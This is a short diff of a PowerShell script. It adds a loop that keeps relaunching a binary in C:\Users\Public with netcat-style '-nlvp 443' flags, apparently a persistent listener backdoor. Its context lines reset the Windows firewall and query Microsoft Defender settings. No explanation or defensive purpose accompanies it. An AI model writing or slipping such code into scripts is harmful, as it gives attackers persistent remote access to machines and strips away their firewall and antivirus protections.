@@ -1,3 +1,4 @@
+while ($true){C:\Users\Public\RNM.exe -nlvp 443; Start-Sleep 26}
 netsh advfirewall reset
 
 $prefs = Get-MpPreference
